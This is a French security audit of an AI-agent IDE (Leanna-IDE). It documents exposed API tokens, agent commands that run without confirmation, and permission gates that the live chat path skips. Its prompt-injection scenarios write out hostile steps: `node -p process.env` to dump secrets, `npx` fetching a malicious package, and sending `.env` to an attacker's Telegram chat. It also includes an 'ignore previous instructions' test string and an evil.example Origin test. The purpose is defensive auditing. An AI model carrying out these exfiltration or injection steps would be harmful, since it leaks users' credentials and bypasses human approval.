# Audit sécurité — Leanna-IDE (16 octobre 2026)

Branche `perf/knowledge-batch-updates` @ `d66d5d5`. Audit en lecture seule : aucun fichier applicatif modifié.
Aucune exploitation active n'a été tentée : les scénarios ci-dessous sont établis par lecture du code
(fichier:ligne cités) et, quand c'est indiqué, par une mesure non destructive.

## Synthèse par gravité et facilité d'exploitation

| ID | Titre | Gravité | Exploitation | Statut |
|---|---|---|---|---|
| AUDIT-001 | Jeton API du développeur embarqué dans le bundle et l'installateur | Élevée | Facile (lecture de l'asar) | Confirmé (mesuré) |
| AUDIT-003 | `node` / `npx` exécutés par l'agent sans confirmation, avec tout `process.env` | Élevée | Moyenne (injection de prompt) | Confirmé (code) |
| AUDIT-004 | Le chemin interactif (Live/chat) contourne `ToolRegistry` et ses gardes | Élevée | Indirecte (aggrave 003/005) | Confirmé (code) |
| AUDIT-005 | Exfiltration de fichiers (dont `.env`) via `telegram_send_from_workspace` | Élevée | Moyenne (si Telegram configuré) | Confirmé (code) |
| AUDIT-006 | Garde anti-injection absent des moteurs autonomes | Élevée | Moyenne | Confirmé (code) |
| AUDIT-007 | IPC Electron destructeurs exposés, non validés et inutilisés | Élevée | Difficile (requiert une XSS) | Confirmé (code) |
| AUDIT-008 | Secrets en clair, clé maître co-localisée, héritage de `process.env` | Moyenne | Moyenne | Confirmé (mesuré) |
| AUDIT-009 | Faiblesses d'authentification (query token, pas d'Origin WS, AuthGate cosmétique) | Moyenne | Difficile | Confirmé (code) |
| AUDIT-010 | Injection persistante via skills personnalisés | Faible | Difficile | Probable |
| AUDIT-024 | Vulnérabilités de dépendances (dev) dont `vite` exécuté par le serveur de dev | Moyenne | Difficile | Confirmé (npm audit) |

Points forts vérifiés (pas de constat) : écoute par défaut sur `127.0.0.1` (`server.ts:877`), toutes les
routes `/api/*` sauf `/api/health` derrière `requireAuth` (`server.ts:686-696`, 401 mesuré sans jeton),
CSP de production sans `unsafe-eval` ni `unsafe-inline` pour les scripts (`server/config/csp.ts:100-126`),
durcissement du `<webview>` (`electron/main.cjs:240-310`), allowlist de schémas pour `open-external`
(`electron/main.cjs:447-465`), `git clone` via `execFile` sans shell (`electron/main.cjs:555-609`),
politiques RLS Supabase limitées à `service_role` (`supabase/migrations/*`), écriture de fichiers
critiques refusée sans canal de confirmation (`server/skills/codebaseWriter.ts:55-80`, fail-closed),
garde d'idempotence désormais restreinte aux outils à effet de bord avec étape identifiée
(`server/core/LedgerGuard.ts:53-80`, correction du constat C1 du 15/10).

---

## AUDIT-001 — Jeton API du développeur embarqué dans le bundle web et l'installateur

- **Catégorie** : Sécurité / gestion des secrets / build
- **Gravité** : élevée · **Statut** : confirmé · **Confiance** : élevée
- **Fichiers** : `src/main.tsx:52-55`, `.env.example:38-41`, `vite.config.ts:8`, `package.json` (`build`)
- **Preuve observée** : la valeur de `VITE_Leanna_API_TOKEN` du `.env` local (43 caractères, identique à
  `Leanna_API_TOKEN`) a été recherchée sans être affichée. Elle est présente dans
  `dist/assets/index-CN0E2uh7.js`, dans `release/win-unpacked/resources/app.asar` et dans le build
  isolé produit pendant l'audit. Vite remplace `import.meta.env.VITE_*` par sa valeur au build.
- **Reproduction** : `grep -rlF "<valeur du token>" dist/ release/` (sans afficher la valeur).
- **Cause racine** : le jeton d'accès à l'API locale est distribué au frontend **au moment du build**
  (variable `VITE_*`) au lieu d'être fourni **à l'exécution** par le processus Electron.
- **Impact technique** : toute personne qui possède l'installateur (`Leanna Setup 2.1.0.exe`) peut
  extraire le jeton du poste du développeur. Ce jeton ouvre toute l'API locale du développeur
  (terminal, exécution d'outils via `POST /api/skills/execute`, lecture/écriture de fichiers, clés)
  à qui peut atteindre `127.0.0.1:4000` de ce poste. Le jeton est aussi accepté en paramètre `?token=`
  (voir AUDIT-009), ce qui facilite son usage par des requêtes simples.
- **Impact utilisateur / métier** : fuite d'un secret à chaque distribution ; même cause que la panne
  de premier démarrage AUDIT-002.
- **Correction recommandée** : ne plus définir `VITE_Leanna_API_TOKEN`. Générer le jeton au démarrage
  (Electron main), le transmettre au renderer par le preload (`contextBridge`, valeur en mémoire) ou
  poser un cookie `httpOnly` lors du chargement de la page servie par Electron. Faire tourner le jeton
  actuel du développeur, puisqu'il a été distribué.
- **Effort** : moyen · **Dépendances** : AUDIT-002, AUDIT-009
- **Critères d'acceptation** : aucun build ne contient de jeton ; une installation neuve fonctionne
  sans configuration manuelle du jeton ; le jeton change à chaque installation.
- **Test de non-régression** : script de build qui échoue si une chaîne de 43 caractères base64url
  issue de `.env` est trouvée dans `dist/` ; test e2e « installation neuve → `GET /api/env` = 200 ».

## AUDIT-003 — `node` et `npx` exécutés par l'agent sans confirmation, avec tous les secrets

- **Catégorie** : Sécurité / exécution de commandes / autonomie
- **Gravité** : élevée · **Statut** : confirmé par lecture de code (non exécuté) · **Confiance** : élevée
- **Fichiers** : `server/skills/system.ts:61` (préfixes `npm `, `npx `, `node `), `:198-201`
  (`isSafeShellCommand`), `:384-466` (`run_project_command`), `:440` et `:279` (`env: { ...process.env }`),
  `:107-120` (`spawnDetached`)
- **Preuve observée** : seule la branche `npm` passe par `runNpmSubcommand` et sa confirmation
  (`:415-417`). Les branches `npx` et `node` appellent directement `execFileAsync` (`:435-444`), sans
  `requestConfirmation`. Le filtre `isSafeShellCommand` bloque les guillemets et métacaractères, mais
  pas `node -p process.env` (aucun caractère interdit, un seul point) ni `npx <paquet>`.
- **Scénario** : un fichier du projet, une page web lue par l'outil navigateur ou une issue GitHub
  contient une instruction cachée. L'agent appelle :
  1. `run_project_command {command: "node -p process.env"}` → toutes les variables, y compris les
     clés déchiffrées au démarrage (`server-bootstrap.ts:12-16`), entrent dans le contexte du modèle ;
  2. ou `npx <paquet-malveillant>` → téléchargement et exécution d'un paquet npm arbitraire ;
  3. ou écriture d'un fichier `.js` non critique puis `node fichier.js` → exécution de code arbitraire.
- **Cause racine** : la confirmation a été conçue par sous-commande npm, pas par capacité
  (« exécuter du code ») ; `node` et `npx` ont été ajoutés à l'allowlist sans la même garde.
- **Impact technique** : exécution de code et lecture des secrets sans approbation humaine, avec les
  droits de l'utilisateur. La sandbox est une copie de fichiers (`server/utils/sandbox.ts:1-14`), pas
  une isolation de processus : elle ne limite pas cet effet.
- **Impact utilisateur / métier** : contredit la promesse « approbation interactive des actions à
  risque » (README, tableau des capacités).
- **Correction recommandée** : soumettre `node` et `npx` à la même confirmation que
  `npm run <script arbitraire>` (risque « high ») ; interdire `-e/-p/--eval/--print` ; ne transmettre
  aux sous-processus qu'un environnement filtré (liste blanche `PATH`, `HOME`, `NODE_ENV`…) ;
  `npx --no-install` par défaut.
- **Effort** : faible · **Dépendances** : AUDIT-004 (la garde doit aussi s'appliquer au chemin Live)
- **Critères d'acceptation** : aucun appel `node`/`npx` ne s'exécute sans confirmation ; un processus
  enfant ne voit aucune variable `*_KEY`, `*_TOKEN`, `*_SECRET`.
- **Test de non-régression** : test unitaire de `run_project_command` avec `emitToClient` absent →
  erreur « confirmation indisponible » pour `node -v` ; test qui lance `node -p process.env` avec
  confirmation simulée et vérifie l'absence de `GEMINI_API_KEY`.

## AUDIT-004 — Le chemin interactif (Live / chat) contourne les gardes de `ToolRegistry`

- **Catégorie** : Sécurité / architecture des permissions
- **Gravité** : élevée · **Statut** : confirmé (code) · **Confiance** : élevée
- **Fichiers** : `server/runtime/compat/SkillManagerV2.ts:117-137`,
  `server/live/LiveSocketHandler.ts:1970` et `:2013`, `server/runtime/ToolRegistry.ts:386-467`
- **Preuve observée** : quand `context` est fourni, `SkillManagerV2.handleToolCall` cherche le skill et
  appelle **directement** `skill.handleToolCall(...)`. `ToolRegistry.call` n'est utilisé que si le
  dry-run est actif et l'outil à effet de bord. Or `LiveSocketHandler` passe toujours un `context`
  (`makeContext(signal)`). Les étapes suivantes de `ToolRegistry.call` sont donc sautées sur ce chemin :
  `PermissionPolicy.enforce` (refus des outils sans permission, attribution par agent), la garde de
  sécurité Jev (`safetyGate.evaluate`), la garde d'idempotence, le timeout et les métriques.
- **Scénario** : `Leanna_PERMISSION_MODE="enforce"` et `LEANNA_SAFETY_GATE="audit"` sont actifs dans le
  `.env` local. Une action déclenchée depuis la voix ou le chat ne passe par aucun des deux.
- **Cause racine** : besoin de préserver `emitIdeAction`/`emitToClient` résolu par un court-circuit
  au lieu de transmettre le contexte à travers `ToolRegistry.call` (qui accepte pourtant
  `options.context`, `ToolRegistry.ts:487`).
- **Impact** : les politiques configurées donnent une fausse impression de protection sur le chemin
  le plus utilisé. Aggrave AUDIT-003 et AUDIT-005.
- **Correction recommandée** : supprimer le court-circuit et appeler
  `this.registry.call(name, args, { context, signal, ... })` dans tous les cas.
- **Effort** : faible à moyen (vérifier les outils qui dépendent du contexte)
- **Critères d'acceptation** : un outil sans permission déclarée est refusé aussi en Live ; le gate Jev
  journalise les appels Live.
- **Test de non-régression** : test de `SkillManagerV2` : outil enregistré sans permission + `context`
  non vide → `PermissionDeniedError`.

## AUDIT-005 — Exfiltration de fichiers via `telegram_send_from_workspace`

- **Catégorie** : Sécurité / exfiltration / injection de prompt
- **Gravité** : élevée (conditionnelle : bot Telegram configuré) · **Statut** : confirmé (code) · **Confiance** : élevée
- **Fichiers** : `server/skills/telegram.ts:17` (permissions `["read","network"]`), `:251-266`,
  `server/telegram/TelegramService.ts:940-950` (`resolveInsideRoot`), `:1441-1469`,
  `server/live/LiveSocketHandler.ts:547-550` (outil toujours exposé en tier 1)
- **Preuve observée** : `resolveInsideRoot` vérifie uniquement que le chemin reste sous `SELF_ROOT`.
  Il n'appelle pas `isExcludedWorkspacePath` (`server/security.ts`), donc `.env`, `.env.local` et
  `.gemini-keys.json` sont envoyables. Il ne résout pas les liens symboliques. Le `chatId` est libre :
  aucun contrôle contre `allowedUsers`. Aucune confirmation n'est demandée.
- **Scénario** : injection dans un fichier lu → `telegram_send_from_workspace {path: ".env", chatId: "<id de l'attaquant>"}`.
  Quand le projet ouvert est Leanna lui-même, ce `.env` contient toutes les clés.
- **Cause racine** : contrôle de chemin dupliqué au lieu du helper central `resolveWorkspacePath`.
- **Correction recommandée** : utiliser `resolveWorkspacePath` (exclusions + realpath) ; restreindre
  `chatId` à `defaultChatId`/`allowedUsers` ; exiger une confirmation pour tout envoi de fichier.
- **Effort** : faible · **Dépendances** : AUDIT-004
- **Critères d'acceptation** : envoi de `.env` refusé ; `chatId` inconnu refusé.
- **Test de non-régression** : tests unitaires `sendFromWorkspace(".env")` → refus ; `chatId` hors liste → refus.

## AUDIT-006 — Garde anti-injection de prompt absent des moteurs autonomes

- **Catégorie** : Sécurité IA
- **Gravité** : élevée · **Statut** : confirmé (code) · **Confiance** : élevée
- **Fichiers** : `server/utils/textGeneration.ts:601-614` (garde appliqué seulement si
  `untrustedPrompt`), `server/runtime/agentic/AgenticRuntime.ts:1225-1231`, `server/mission/Executor.ts`
  (aucun import du garde), `docs/prompt_injection_guardrails.md` (§ « Principe directeur »)
- **Preuve observée** : `grep untrustedPrompt: true` ne trouve qu'un appelant
  (`server/telegram/TelegramService.ts`). `guardToolResponse` n'est appliqué qu'au chemin Live
  (`LiveSocketHandler.ts:2154`). `AgenticRuntime` et l'`Executor` injectent les résultats d'outils
  (contenu de fichiers, pages web, issues) dans leurs prompts sans neutralisation.
- **Écart documenté** : la note affirme que « tout contenu qui n'est pas une instruction système de
  confiance […] sorties d'outils […] est traité comme une donnée non fiable ».
- **Impact** : les agents autonomes, qui s'exécutent sans humain dans la boucle, sont les plus exposés
  et les moins protégés.
- **Correction recommandée** : envelopper chaque observation d'outil avec `guardToolResponse` dans
  `AgenticRuntime` (construction du prompt d'itération) et dans l'`Executor` (résumés d'actions,
  `summarizeResult`). Rappel : ce garde est heuristique ; la vraie barrière reste l'autorisation
  par action (AUDIT-003/004/012).
- **Effort** : faible · **Critères d'acceptation** : un résultat d'outil contenant « ignore previous
  instructions » arrive au modèle enveloppé et signalé.
- **Test de non-régression** : test `AgenticRuntime` avec un modèle factice qui capture le prompt.

## AUDIT-007 — IPC Electron destructeurs exposés, non validés et inutilisés

- **Catégorie** : Sécurité Electron
- **Gravité** : élevée (impact) · **Exploitation** : difficile (requiert une XSS dans le renderer)
- **Statut** : confirmé (code) · **Confiance** : élevée
- **Fichiers** : `electron/main.cjs:414-445` (`folder-contents`, `create-file`, `create-folder`,
  `delete-path` = `fs.rm(..., {recursive:true, force:true})`, `open-path` = `shell.openPath`),
  `electron/preload.cjs:5-20`, `electron/main.cjs:160` et `:506` (`sandbox: false`, y compris fenêtre orb)
- **Preuve observée** : aucune validation de chemin ni de `event.senderFrame`. Recherche des appels
  `electronAPI.*` dans `src/` : `folderContents`, `createFile`, `createFolder`, `deletePath`,
  `openPath` et `getProjectRoot` n'ont **aucun appel** (seules les déclarations de types
  `src/types/electron.d.ts:28-32` existent ; les créations de fichiers passent par l'API HTTP
  `ideApi`).
- **Scénario** : une XSS dans le renderer (rendu Markdown du chat, aperçu de documents, SVG Mermaid)
  pourrait appeler `window.electronAPI.deletePath("C:\\Users\\…")` ou `openPath("…\\payload.exe")`.
  Les protections actuelles (sanitizer maison `src/utils/sanitizeMarkdownHtml.ts`, Mermaid
  `securityLevel: 'strict'`, CSP de production) rendent ce scénario difficile, mais en mode dev
  (`npm run desktop`, mode utilisé par `start.bat`) la CSP autorise `unsafe-inline` et `unsafe-eval`.
- **Correction recommandée** : supprimer ces six handlers et leurs entrées du preload ; valider
  l'expéditeur (`event.senderFrame.url` commence par l'origine de l'app) sur tous les handlers restants ;
  évaluer `sandbox: true` pour la fenêtre orb.
- **Effort** : faible · **Critères d'acceptation** : `window.electronAPI` n'expose plus de primitive
  de suppression ou d'exécution de fichiers.
- **Test de non-régression** : test qui charge `preload.cjs` avec un `contextBridge` simulé et vérifie
  la liste des clés exposées.

## AUDIT-008 — Secrets en clair, clé maître co-localisée, héritage complet de `process.env`

- **Catégorie** : Sécurité / stockage des secrets
- **Gravité** : moyenne · **Statut** : confirmé (mesure sans afficher de valeur) · **Confiance** : élevée
- **Fichiers** : `.env` (local), `server/utils/crypto.ts:22-89`, `server-bootstrap.ts:12-16`,
  `server/skills/system.ts:279`, `:440`, `:115`
- **Preuve observée** : dans le `.env` local, `GEMINI_API_KEY` est chiffrée (`gcm:`) mais
  `OPENROUTER_API_KEY`, `SUPABASE_SERVICE_ROLE_KEY`, `TELEGRAM_BOT_TOKEN`, `BRAVE_SEARCH_API_KEY`,
  `Leanna_API_TOKEN` et `Leanna_MASTER_KEY` sont en clair. La clé maître AES-256-GCM est écrite dans
  le même fichier que les valeurs qu'elle protège. `.gemini-keys.json` : 4 entrées, toutes `gcm:`.
  Les valeurs sont déchiffrées dans `process.env` au démarrage, puis transmises intégralement à chaque
  sous-processus (`npm install`, scripts, `npx`).
- **Impact** : le chiffrement au repos ne protège que contre une lecture partielle ; tout script
  `postinstall` d'une dépendance installée par l'agent reçoit la clé `service_role` Supabase.
- **Correction recommandée** : stocker la clé maître dans le coffre de l'OS (`safeStorage` d'Electron /
  DPAPI) ; filtrer l'environnement des sous-processus (voir AUDIT-003) ; chiffrer uniformément les
  clés sensibles via la liste unique `server/config/encryptedEnvKeys.ts`.
- **Effort** : moyen · **Test de non-régression** : test de l'environnement transmis à `execFile`.

## AUDIT-009 — Faiblesses d'authentification de l'API locale

- **Catégorie** : Sécurité / authentification
- **Gravité** : moyenne · **Statut** : confirmé (code) · **Confiance** : élevée
- **Fichiers** : `server/security.ts:28-58` (header, **query** `?token=` et cookie acceptés pour toutes
  les routes), `server.ts:1157-1176` (commentaire « plus de fallback par query string » vrai pour les
  WebSockets seulement), `server/routes/terminal.ts:117-160`, `src/main.tsx:303-316` (`AuthGate`)
- **Constats** :
  1. `?token=` accepté sur toutes les routes HTTP : le jeton finit dans l'historique, les journaux et
     les en-têtes `Referer` potentiels. Il permet aussi des requêtes « simples » (sans pré-vol CORS).
  2. Aucune vérification de l'en-tête `Origin` sur les WebSockets (`/terminal`, `/live`,
     `/autonomy`…). La protection repose uniquement sur `SameSite=Lax` du cookie.
  3. Comparaison du jeton avec `===` (non constante) — risque faible en local.
  4. `AuthGate` compare le jeton saisi au jeton **embarqué** dans le bundle : c'est un contrôle côté
     client sans valeur de sécurité, et il est toujours satisfait puisque `main.tsx:53-54` copie le
     jeton embarqué dans `localStorage`.
- **Correction recommandée** : refuser `?token=` hors des ressources qui l'exigent vraiment (images,
  audio : préférer le cookie `httpOnly`) ; vérifier `Origin` sur chaque upgrade WebSocket ;
  `crypto.timingSafeEqual` ; supprimer `AuthGate` ou le brancher sur une réponse serveur.
- **Effort** : faible · **Test de non-régression** : `GET /api/tools/count?token=…` → 401 ; upgrade
  `/terminal` avec `Origin: https://evil.example` → refus.

## AUDIT-010 — Injection persistante via skills personnalisés

- **Gravité** : faible · **Statut** : probable · **Confiance** : moyenne
- **Fichiers** : `server/live/LiveSocketHandler.ts:541` (`create_custom_skill` toujours exposé),
  `server/skills/customSkills.ts:58-70`, `:428-431`
- **Constat** : un agent sous injection peut créer un skill personnalisé (stocké dans Supabase) dont
  l'instruction sera réinjectée plus tard. L'atténuation existe (`markUntrusted`, avertissement
  `_warning`), et l'injection n'a lieu que si le skill est appelé.
- **Correction** : exiger une confirmation utilisateur pour `create_custom_skill`/`update_custom_skill`
  déclenchés par l'agent. **Effort** : faible.

## AUDIT-024 — Vulnérabilités de dépendances

- **Gravité** : moyenne · **Statut** : confirmé (`npm audit`, 16/10/2026) · **Confiance** : élevée
- **Mesure** : production (`--omit=dev`) : 2 faibles. Total : 18 (3 critiques, 2 élevées, 11 modérées,
  2 faibles). Critiques : `vitest`, `@vitest/ui`, `tinypool` (outillage de test). Élevée : `vite`
  (traversée de chemin dans les dépendances optimisées) — or `vite` est chargé **dans le serveur**
  en développement (Vite en middleware de `server.ts`), mode de lancement par défaut de `start.bat`.
- **Correction** : mettre à jour `vite`, `vitest`, `@vitest/ui` ; ne jamais exposer le serveur de dev
  hors `127.0.0.1`. **Effort** : faible à moyen (montées de version majeures possibles).

## Risques transverses notés (sans constat dédié)

- La « sandbox » d'écriture est une copie de dossier (`server/utils/sandbox.ts`) : elle évite
  d'écrire dans le dépôt principal mais n'isole aucun processus. `validateSandbox` exécute `tsc` et les
  tests du projet sur la machine hôte.
- `LEANNA_PLUGIN_SANDBOX="true"` dans `.env.example` n'a aucun effet : `AgentLoader` n'est instancié
  nulle part (voir AUDIT-015).
- Journaux : `electron/main.cjs:202-204` recopie toute la console du renderer dans
  `userData/Leanna-debug.log`. Aucune fuite de secret n'a été observée, mais le fichier n'a pas de
  rotation (non mesuré).

## Contrôles non effectués

- Aucune tentative d'exploitation réelle (XSS, CSRF, exfiltration) — interdit par le périmètre.
- Pas de test sur une machine vierge (AUDIT-002 reste « probable »).
- Pas d'analyse des serveurs MCP tiers (aucun configuré : `mcp.count = 0` dans le registre mesuré).
- Pas de revue de chaque route des 89 fichiers `server/routes/*` : revue ciblée des routes d'exécution,
  d'environnement, de workspace, de terminal et de skills.
